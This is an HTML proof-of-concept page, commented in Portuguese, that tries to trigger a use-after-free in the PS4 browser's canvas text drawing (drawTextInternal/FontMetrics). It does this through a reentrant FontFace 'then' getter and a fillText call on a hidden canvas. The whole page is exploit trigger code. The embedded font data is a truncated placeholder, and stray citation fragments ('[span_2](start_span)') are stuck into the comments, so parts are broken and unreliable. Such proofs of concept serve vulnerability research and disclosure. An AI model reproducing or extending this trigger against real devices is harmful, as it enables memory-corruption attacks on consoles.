<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>PoC - PS4 drawTextInternal FontMetrics UAF</title>
</head>
<body>
<script>
async function runPoC() {
    // 1. Configuração do ambiente de fontes para o gatilho de reentrância
    const fontDataURL = 'data:font/woff;base64,d09GRgABAAAA...'; // Insira os bytes válidos da fonte ou use o seu setup existente

    const face1 = new FontFace('testFace', 'url("' + fontDataURL + '")');
    const face2 = new FontFace('testFace', 'url("' + fontDataURL + '")');
    
    document.fonts.add(face1);
    document.fonts.add(face2);

    void face1.loaded;
    void face2.loaded;

    // 2. O gancho reentrante idêntico ao que você já validou no seu report
    const reenterFontFaceSet = function() {
        document.fonts.add(new FontFace('unrelated', 'local("Arial")'));
    };
    
    Object.defineProperty(face1, 'then', { get: reenterFontFaceSet, configurable: true });
    Object.defineProperty(face2, 'then', { get: reenterFontFaceSet, configurable: true });

    const canvas = document.createElement('canvas');
    canvas.width = 200;
    canvas.height = 200;
    canvas.style.position = 'absolute';
    canvas.style.left = '-9999px';
    document.body.appendChild(canvas);
    
    const context = canvas.getContext('2d');
    context.font = '10px Times, testFace';

    // 3. O alvo real: fillText() -> invoca drawTextInternal() no C++ do PS4[span_2](start_span)[span_2](end_span),
    // onde o fontMetrics é capturado antes de font.width() e consumido depois[span_3](start_span)[span_3](end_span).
    try {
        context.fillText(String.fromCharCode(0x13A0), 10, 50);
    } catch (e) {
        console.error(e);
    }
}

runPoC();
</script>
</body>
</html>
